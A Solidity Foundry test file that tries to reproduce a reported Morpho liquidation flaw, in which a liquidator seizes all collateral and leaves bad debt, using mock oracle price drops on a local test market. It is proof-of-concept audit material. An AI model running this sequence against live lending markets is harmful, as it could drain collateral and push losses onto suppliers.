// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./BaseTest.sol";

/**
 * @title LiquidationExploitTest
 * @dev Test designed to reproduce the liquidation vulnerability in Morpho protocol
 * The vulnerability allows liquidators to seize all collateral while not repaying the full debt,
 * triggering bad debt handling and profiting more than the intended liquidation incentive.
 */
contract LiquidationExploitTest is BaseTest {
    using MathLib for uint256;
    using SharesMathLib for uint256;
    using MorphoLib for IMorpho;

    // Mock account to serve as a liquidator
    address internal ATTACKER;

    function setUp() public override {
        super.setUp();
        ATTACKER = makeAddr("Attacker");

        // Approve liquidator to move tokens
        vm.startPrank(ATTACKER);
        loanToken.approve(address(morpho), type(uint256).max);
        collateralToken.approve(address(morpho), type(uint256).max);
        vm.stopPrank();
    }

    /**
     * @dev Main test function that attempts to reproduce the vulnerability
     */
    function testLiquidationVulnerability() public {
        // Set up an LLTV (Liquidation Loan-to-Value) close to real market parameters
        uint256 lltv = 0.965e18; // 96.5% LTV
        _setLltv(lltv);

        // Setup a scenario similar to what was described in the report
        // Create a supplier with funds
        uint256 supplyAmount = 1000e18; // 1000 tokens
        loanToken.setBalance(SUPPLIER, supplyAmount);
        vm.prank(SUPPLIER);
        morpho.supply(marketParams, supplyAmount, 0, SUPPLIER, hex"");

        // Create a borrower with collateral
        uint256 collateralAmount = 100e18; // 100 tokens of collateral

        // Calculate maximum borrow amount just below the ltv threshold
        uint256 collateralPrice = oracle.price(); // 1:1 initially
        uint256 maxBorrow = collateralAmount * collateralPrice / ORACLE_PRICE_SCALE * lltv / WAD;
        uint256 borrowAmount = maxBorrow * 99 / 100; // 99% of max to start healthy

        console.log("Collateral: %d", collateralAmount / 1e18);
        console.log("Max borrow: %d", maxBorrow / 1e18);
        console.log("Actual borrow: %d", borrowAmount / 1e18);

        // Supply collateral
        collateralToken.setBalance(BORROWER, collateralAmount);
        vm.startPrank(BORROWER);
        morpho.supplyCollateral(marketParams, collateralAmount, BORROWER, hex"");

        // Borrow
        morpho.borrow(marketParams, borrowAmount, 0, BORROWER, BORROWER);
        vm.stopPrank();

        // Record state before liquidation
        uint256 borrowShares = morpho.borrowShares(id, BORROWER);
        uint256 totalBorrowShares = morpho.totalBorrowShares(id);
        uint256 totalBorrowAssets = morpho.totalBorrowAssets(id);

        console.log("Initial LTV: %d%%", (borrowAmount * 100) / collateralAmount);
        console.log("Borrower's debt shares: %d", borrowShares);
        console.log("Total borrow assets: %d", totalBorrowAssets / 1e18);

        // Make position unhealthy by dropping the price
        uint256 originalPrice = oracle.price();
        uint256 newPrice = originalPrice * 95 / 100; // Drop price by 5%
        oracle.setPrice(newPrice);

        // Verify position is unhealthy
        bool isHealthy = _isHealthy(marketParams, BORROWER);
        console.log("Position healthy after price drop: %s", isHealthy ? "true" : "false");

        if (isHealthy) {
            // If still healthy, drop the price more
            console.log("Further reducing price to make position unhealthy");
            newPrice = originalPrice * 90 / 100; // Drop price by 10%
            oracle.setPrice(newPrice);
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Position healthy after further price drop: %s", isHealthy ? "true" : "false");
        }

        require(!isHealthy, "Position is still healthy, cannot liquidate");

        // Fund the attacker with enough tokens to repay
        loanToken.setBalance(ATTACKER, borrowAmount);

        // Calculate liquidation parameters
        uint256 liquidationIncentive = _liquidationIncentiveFactor(marketParams.lltv);
        console.log("Liquidation incentive factor: %d", liquidationIncentive / 1e16);

        // Record pre-liquidation balances
        uint256 attackerLoanBefore = loanToken.balanceOf(ATTACKER);
        uint256 attackerCollateralBefore = collateralToken.balanceOf(ATTACKER);
        uint256 borrowerCollateralBefore = morpho.collateral(id, BORROWER);
        uint256 borrowerDebtBefore = morpho.borrowShares(id, BORROWER);

        console.log("--- Pre-Liquidation State ---");
        console.log("Borrower collateral: %d", borrowerCollateralBefore / 1e18);
        console.log("Borrower debt shares: %d", borrowerDebtBefore);

        // Try to liquidate the position by seizing all collateral
        vm.prank(ATTACKER);
        (uint256 seizedAssets, uint256 repaidAssets) = morpho.liquidate(
            marketParams,
            BORROWER,
            borrowerCollateralBefore, // Try to seize all collateral
            0,
            hex""
        );

        // Record post-liquidation balances
        uint256 attackerLoanAfter = loanToken.balanceOf(ATTACKER);
        uint256 attackerCollateralAfter = collateralToken.balanceOf(ATTACKER);
        uint256 borrowerCollateralAfter = morpho.collateral(id, BORROWER);
        uint256 borrowerDebtAfter = morpho.borrowShares(id, BORROWER);

        console.log("--- Liquidation Results ---");
        console.log("Seized collateral: %d", seizedAssets / 1e18);
        console.log("Repaid debt: %d", repaidAssets / 1e18);
        console.log("Borrower remaining collateral: %d", borrowerCollateralAfter / 1e18);
        console.log("Borrower remaining debt shares: %d", borrowerDebtAfter);

        // Check if bad debt was triggered (collateral = 0 but debt > 0)
        bool badDebtTriggered = (borrowerCollateralAfter == 0 && borrowerDebtAfter > 0);
        console.log("Bad debt triggered: %s", badDebtTriggered ? "true" : "false");

        // Calculate actual vs expected profit
        if (attackerLoanBefore > attackerLoanAfter) {
            uint256 loanCost = attackerLoanBefore - attackerLoanAfter;
            uint256 collateralGain = attackerCollateralAfter - attackerCollateralBefore;
            uint256 collateralValue = collateralGain * newPrice / ORACLE_PRICE_SCALE;

            uint256 actualProfit = 0;
            if (collateralValue > loanCost) {
                actualProfit = collateralValue - loanCost;
            }

            uint256 expectedProfit = 0;
            if (liquidationIncentive > WAD) {
                expectedProfit = loanCost * (liquidationIncentive - WAD) / WAD;
            }

            console.log("--- Profit Analysis ---");
            console.log("Loan cost: %d", loanCost / 1e18);
            console.log("Collateral gain value: %d", collateralValue / 1e18);
            console.log("Actual profit: %d", actualProfit / 1e18);
            console.log("Expected profit: %d", expectedProfit / 1e18);

            if (actualProfit > expectedProfit && badDebtTriggered) {
                uint256 profitRatio = 0;
                if (expectedProfit > 0) {
                    profitRatio = actualProfit * 100 / expectedProfit;
                    console.log("VULNERABILITY CONFIRMED! Profit amplification: %d.%dx",
                        profitRatio / 100,
                        profitRatio % 100);
                } else {
                    console.log("VULNERABILITY CONFIRMED! Expected profit is zero, cannot calculate ratio.");
                }
            } else {
                console.log("Vulnerability not reproduced in this scenario");
            }
        } else {
            console.log("Something unexpected happened - attacker didn't spend tokens");
        }
    }

    /**
     * @dev Third test case: Small, focused test with minimal values
     */
    function testMinimalExploit() public {
        // Setup a very simple test case with small values
        uint256 lltv = 0.80e18; // 80% LTV
        _setLltv(lltv);

        // Supply liquidity
        uint256 supplyAmount = 100e18; // 100 tokens
        loanToken.setBalance(SUPPLIER, supplyAmount);
        vm.prank(SUPPLIER);
        morpho.supply(marketParams, supplyAmount, 0, SUPPLIER, hex"");

        // Create borrower position
        uint256 collateralAmount = 10e18; // 10 tokens of collateral
        uint256 borrowAmount = 7e18;      // 7 tokens to borrow (70% LTV)

        console.log("Setting up position:");
        console.log("- Collateral: 10 tokens");
        console.log("- Borrowed: 7 tokens");
        console.log("- Initial LTV: 70%");

        // Setup borrower
        collateralToken.setBalance(BORROWER, collateralAmount);
        vm.startPrank(BORROWER);
        morpho.supplyCollateral(marketParams, collateralAmount, BORROWER, hex"");
        morpho.borrow(marketParams, borrowAmount, 0, BORROWER, BORROWER);
        vm.stopPrank();

        // Make position unhealthy with 15% price drop
        oracle.setPrice(0.85e36); // Set to absolute value instead of relative calculation

        // Verify it's unhealthy
        bool isHealthy = _isHealthy(marketParams, BORROWER);
        console.log("Position healthy after price drop: %s", isHealthy ? "true" : "false");

        if (isHealthy) {
            oracle.setPrice(0.80e36); // Try an even lower price
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Position healthy after further price drop: %s", isHealthy ? "true" : "false");
        }

        require(!isHealthy, "Position should be unhealthy for liquidation");

        // Fund attacker
        loanToken.setBalance(ATTACKER, borrowAmount);

        // Pre-liquidation state
        uint256 borrowerCollateral = morpho.collateral(id, BORROWER);
        uint256 borrowerDebtShares = morpho.borrowShares(id, BORROWER);
        uint256 liquidationIncentive = _liquidationIncentiveFactor(marketParams.lltv);

        console.log("Liquidation incentive: %d basis points", ((liquidationIncentive - WAD) * 10000) / WAD);
        console.log("Borrower's collateral: %d tokens", borrowerCollateral / 1e18);
        console.log("Borrower's debt shares: %d", borrowerDebtShares);

        // Execute liquidation with all collateral
        vm.prank(ATTACKER);
        try morpho.liquidate(
            marketParams,
            BORROWER,
            borrowerCollateral,
            0,
            hex""
        ) returns (uint256 seizedAssets, uint256 repaidAssets) {
            // Check results
            uint256 borrowerCollateralAfter = morpho.collateral(id, BORROWER);
            uint256 borrowerDebtSharesAfter = morpho.borrowShares(id, BORROWER);

            console.log("Liquidation results:");
            console.log("- Seized assets: %d tokens", seizedAssets / 1e18);
            console.log("- Repaid assets: %d tokens", repaidAssets / 1e18);
            console.log("- Borrower's remaining collateral: %d", borrowerCollateralAfter / 1e18);
            console.log("- Borrower's remaining debt shares: %d", borrowerDebtSharesAfter);

            // Check for bad debt
            bool badDebtTriggered = (borrowerCollateralAfter == 0 && borrowerDebtSharesAfter > 0);

            if (badDebtTriggered) {
                console.log("VULNERABILITY CONFIRMED: Bad debt triggered!");
                console.log("- All collateral seized but debt remains");
                console.log("- Remaining debt shares: %d", borrowerDebtSharesAfter);

                // Skipping complex profit calculations to avoid potential overflows
                console.log("Vulnerability condition satisfied: seizing all collateral left debt behind");
            } else {
                console.log("Vulnerability not reproduced - all debt was repaid");
            }
        } catch Error(string memory reason) {
            console.log("Liquidation failed with reason: %s", reason);
        } catch {
            console.log("Liquidation failed with unknown error");
        }
    }

    /**
     * @dev A final attempt to reproduce with a special focus on edge cases
     */
    function testEdgeCaseExploit() public {
        // Market parameters
        uint256 lltv = 0.8e18; // 80% LTV
        _setLltv(lltv);

        // Setup simple position with 10 tokens collateral, 7.9 tokens borrowed (close to LLTV)
        uint256 collateralAmount = 10e18;
        uint256 borrowAmount = 7.9e18; // 79% LTV (just below 80%)

        // Supply liquidity
        loanToken.setBalance(address(this), 100e18);
        morpho.supply(marketParams, 100e18, 0, address(this), hex"");

        // Setup borrower position
        collateralToken.setBalance(BORROWER, collateralAmount);
        vm.startPrank(BORROWER);
        morpho.supplyCollateral(marketParams, collateralAmount, BORROWER, hex"");
        morpho.borrow(marketParams, borrowAmount, 0, BORROWER, BORROWER);
        vm.stopPrank();

        console.log("Initial setup:");
        console.log("- Collateral: 10 tokens");
        console.log("- Borrowed: 7.9 tokens");
        console.log("- LTV: 79% (near max)");

        // Set absolute price lower rather than calculating
        oracle.setPrice(0.99e36); // 1% lower than initial

        bool isHealthy = _isHealthy(marketParams, BORROWER);
        console.log("Position healthy after small price drop: %s", isHealthy ? "true" : "false");

        if (isHealthy) {
            oracle.setPrice(0.95e36); // 5% lower
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Position after larger price drop: %s", isHealthy ? "still healthy" : "unhealthy");
        }

        if (isHealthy) {
            oracle.setPrice(0.90e36); // 10% lower
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Position after significant price drop: %s", isHealthy ? "still healthy" : "unhealthy");
        }

        require(!isHealthy, "Position must be unhealthy to test liquidation");

        // Fund liquidator
        loanToken.setBalance(ATTACKER, borrowAmount);

        // Record pre-liquidation state
        uint256 collateralBefore = morpho.collateral(id, BORROWER);
        uint256 debtSharesBefore = morpho.borrowShares(id, BORROWER);

        console.log("Pre-liquidation:");
        console.log("- Collateral: %d tokens", collateralBefore / 1e18);
        console.log("- Debt shares: %d", debtSharesBefore);

        // Execute liquidation - use try/catch to handle potential errors
        vm.prank(ATTACKER);
        try morpho.liquidate(
            marketParams,
            BORROWER,
            collateralBefore, // All collateral
            0,
            hex""
        ) returns (uint256 seizedAssets, uint256 repaidAssets) {
            // Check results
            uint256 collateralAfter = morpho.collateral(id, BORROWER);
            uint256 debtSharesAfter = morpho.borrowShares(id, BORROWER);

            console.log("Liquidation results:");
            console.log("- Seized: %d tokens", seizedAssets / 1e18);
            console.log("- Repaid: %d tokens", repaidAssets / 1e18);
            console.log("- Remaining collateral: %d tokens", collateralAfter / 1e18);
            console.log("- Remaining debt shares: %d", debtSharesAfter);

            bool badDebtTriggered = (collateralAfter == 0 && debtSharesAfter > 0);

            if (badDebtTriggered) {
                console.log("VULNERABILITY CONFIRMED: Bad debt triggered!");
                console.log("All collateral was seized but some debt remains");
            } else {
                console.log("Bad debt not triggered in this scenario");
                if (collateralAfter == 0) {
                    console.log("All collateral was seized, but all debt was repaid too");
                } else {
                    console.log("Not all collateral was seized");
                }
            }
        } catch Error(string memory reason) {
            console.log("Liquidation failed with reason: %s", reason);
        } catch {
            console.log("Liquidation failed with unknown error");
        }
    }

    function testRefinedVulnerabilityTest() public {
        // 1. Setup market parameters exactly like the report describes
        uint256 lltv = 0.965e18; // 96.5% LTV as mentioned in the report
        _setLltv(lltv);

        // 2. Add substantial market liquidity
        uint256 supplyAmount = 1_000_000e18;
        loanToken.setBalance(SUPPLIER, supplyAmount);
        vm.prank(SUPPLIER);
        morpho.supply(marketParams, supplyAmount, 0, SUPPLIER, hex"");

        // 3. Create borrower position
        uint256 collateralAmount = 10_000e18; // 10,000 tokens
        uint256 collateralPrice = oracle.price();
        uint256 maxBorrowable = collateralAmount * collateralPrice / ORACLE_PRICE_SCALE * lltv / WAD;
        uint256 borrowAmount = maxBorrowable * 999 / 1000; // 99.9% of maximum

        collateralToken.setBalance(BORROWER, collateralAmount);
        vm.startPrank(BORROWER);
        morpho.supplyCollateral(marketParams, collateralAmount, BORROWER, hex"");
        morpho.borrow(marketParams, borrowAmount, 0, BORROWER, BORROWER);
        vm.stopPrank();

        console.log("Position created:");
        console.log("- Collateral: %d tokens", collateralAmount / 1e18);
        console.log("- Borrowed: %d tokens", borrowAmount / 1e18);
        console.log("- Initial LTV: %d bps", borrowAmount * 10000 / collateralAmount);
        console.log("- Max LTV: %d bps", lltv * 10000 / WAD);

        // 4. Record exact borrower state before price change
        uint256 initialBorrowerCollateral = morpho.collateral(id, BORROWER);
        uint256 initialBorrowerShares = morpho.borrowShares(id, BORROWER);
        uint256 initialTotalBorrowAssets = morpho.totalBorrowAssets(id);
        uint256 initialTotalBorrowShares = morpho.totalBorrowShares(id);

        console.log("Initial shares/assets:");
        console.log("- Borrower's debt shares: %d", initialBorrowerShares);
        console.log("- Total borrow assets: %d", initialTotalBorrowAssets / 1e18);
        console.log("- Total borrow shares: %d", initialTotalBorrowShares);

        // 5. Make position unhealthy with smallest possible price drop
        uint256 originalPrice = oracle.price();
        uint256 newPrice = originalPrice * 995 / 1000; // 0.5% price drop
        oracle.setPrice(newPrice);

        bool isHealthy = _isHealthy(marketParams, BORROWER);
        console.log("Health check after 0.5%% price drop: %s", isHealthy ? "still healthy" : "unhealthy");

        // Keep adjusting until exactly unhealthy
        if (isHealthy) {
            newPrice = originalPrice * 990 / 1000; // 1.0% price drop
            oracle.setPrice(newPrice);
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Health check after 1.0%% price drop: %s", isHealthy ? "still healthy" : "unhealthy");
        }

        if (isHealthy) {
            newPrice = originalPrice * 980 / 1000; // 2.0% price drop
            oracle.setPrice(newPrice);
            isHealthy = _isHealthy(marketParams, BORROWER);
            console.log("Health check after 2.0%% price drop: %s", isHealthy ? "still healthy" : "unhealthy");
        }

        require(!isHealthy, "Position must be unhealthy to test liquidation");

        // 6. Prepare liquidator with sufficient funds
        loanToken.setBalance(ATTACKER, borrowAmount);

        // 7. Calculate the liquidation incentive factor as mentioned in the report
        uint256 liquidationIncentiveFactor = _liquidationIncentiveFactor(marketParams.lltv);
        console.log("Liquidation incentive factor: %d bps", (liquidationIncentiveFactor - WAD) * 10000 / WAD);

        // 8. Detailed logging of key parameters
        console.log("\n--- PRE-LIQUIDATION STATE ---");
        console.log("Borrower collateral: %d tokens", initialBorrowerCollateral / 1e18);
        console.log("Borrower debt shares: %d", initialBorrowerShares);
        console.log("Conversion rates:");
        console.log("- Total borrow assets: %d", initialTotalBorrowAssets / 1e18);
        console.log("- Total borrow shares: %d", initialTotalBorrowShares);

        // 9. Try liquidation with specific error capture
        vm.startPrank(ATTACKER);
        try morpho.liquidate(
            marketParams,
            BORROWER,
            initialBorrowerCollateral, // Try to seize ALL collateral
            0, // Calculate repaid shares based on seized assets
            hex""
        ) returns (uint256 seizedAssets, uint256 repaidAssets) {
            // Success path
            uint256 postBorrowerCollateral = morpho.collateral(id, BORROWER);
            uint256 postBorrowerShares = morpho.borrowShares(id, BORROWER);

            console.log("\n--- LIQUIDATION SUCCEEDED ---");
            console.log("Seized assets: %d tokens", seizedAssets / 1e18);
            console.log("Repaid assets: %d tokens", repaidAssets / 1e18);
            console.log("Remaining borrower collateral: %d tokens", postBorrowerCollateral / 1e18);
            console.log("Remaining borrower debt shares: %d", postBorrowerShares);

            // Check if the vulnerability condition is met
            if (postBorrowerCollateral == 0 && postBorrowerShares > 0) {
                console.log("\n!!! VULNERABILITY CONFIRMED !!!");
                console.log("All collateral seized but debt shares remain");
                console.log("This would trigger bad debt handling");

                // Calculate profit amplification
                uint256 expectedProfit = repaidAssets * (liquidationIncentiveFactor - WAD) / WAD;
                uint256 actualProfit = seizedAssets * newPrice / ORACLE_PRICE_SCALE - repaidAssets;

                console.log("\nProfit analysis:");
                console.log("- Expected profit (from incentive): %d tokens", expectedProfit / 1e18);
                console.log("- Actual profit (from imbalance): %d tokens", actualProfit / 1e18);
                console.log("- Profit amplification: %d%%", actualProfit * 100 / expectedProfit);
            } else {
                console.log("\nNo vulnerability detected - liquidation worked as expected");
                if (postBorrowerCollateral == 0) {
                    console.log("All collateral was seized but all debt was cleared too");
                } else {
                    console.log("Not all collateral was seized");
                }
            }
        } catch Error(string memory reason) {
            // Standard revert with reason
            console.log("\n--- LIQUIDATION REVERTED ---");
            console.log("Error reason: %s", reason);

            // Try to understand why it failed
            console.log("\nAnalyzing possible reasons for failure:");

            // Check share calculations manually to see if they match expectations
            uint256 seizedAssetsQuoted = initialBorrowerCollateral * newPrice / ORACLE_PRICE_SCALE;
            uint256 expectedRepaidShares = seizedAssetsQuoted * WAD / liquidationIncentiveFactor * WAD /
                (initialTotalBorrowAssets * WAD / initialTotalBorrowShares);

            console.log("- Collateral value: %d tokens", seizedAssetsQuoted / 1e18);
            console.log("- Calculated repaid shares: %d", expectedRepaidShares);
            console.log("- Borrower's total shares: %d", initialBorrowerShares);

            if (expectedRepaidShares > initialBorrowerShares) {
                console.log("DIAGNOSIS: The calculated repaid shares exceed borrower's total debt");
                console.log("This suggests proper validation is preventing excess liquidation");
            } else {
                console.log("DIAGNOSIS: Unexpected failure - shares calculation looks valid");
            }
        } catch (bytes memory returnData) {
            // Low-level revert
            console.log("\n--- LIQUIDATION FAILED WITH LOW-LEVEL ERROR ---");
            console.logBytes(returnData);
        }
        vm.stopPrank();
    }
}

